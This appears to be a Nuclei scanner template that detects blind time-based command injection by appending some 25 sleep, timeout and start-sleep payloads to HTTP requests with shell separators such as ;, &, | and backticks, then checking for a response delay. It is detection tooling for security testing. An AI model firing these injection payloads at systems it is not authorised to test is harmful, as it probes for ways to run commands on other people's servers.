id: command-injection-blind-time-based

info:
  name: Command Injection - Blind Time based
  author: pdteam
  severity: critical
  reference:
    - https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/CommandInjectionScanRule.java

http:
  - payloads:
      injections:
        low:
          - "&sleep [SLEEPTIME]&"
          - ";sleep [SLEEPTIME];"
          - "&timeout /T [SLEEPTIME]"
          - "$(sleep [SLEEPTIME])"
          - "`sleep [SLEEPTIME]`"
        medium:
          - "|timeout /T [SLEEPTIME]"
          - ";start-sleep -s [SLEEPTIME]"
          - "\"&sleep [SLEEPTIME]&\""
          - "\";sleep [SLEEPTIME];\""
          - "\"&timeout /T [SLEEPTIME]&\""
          - "\";start-sleep -s [SLEEPTIME]"
          - "'&sleep [SLEEPTIME]&'"
          - "';sleep [SLEEPTIME];'"
        high:
          - "'&timeout /T [SLEEPTIME]&'"
          - "'|timeout /T [SLEEPTIME]"
          - "';start-sleep -s [SLEEPTIME]"
          - "\nsleep [SLEEPTIME]\n"
          - "`sleep [SLEEPTIME]`"
          - "||sleep [SLEEPTIME]"
          - "&&sleep [SLEEPTIME]"
          - "\"|timeout /T [SLEEPTIME]"
          - "|sleep [SLEEPTIME]#"
          - "run timeout /T [SLEEPTIME]"
          - ";start-sleep -s [SLEEPTIME] #"
          - "&[SLEEPTIME]&"
          - ";[SLEEPTIME];"

    attack: pitchfork
    analyzer:
      name: time_delay
        
    fuzzing:
      - part: request
        type: postfix
        mode: single
        fuzz:
          - "{{injections}}"
          
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: analyzer
        words:
          - "true"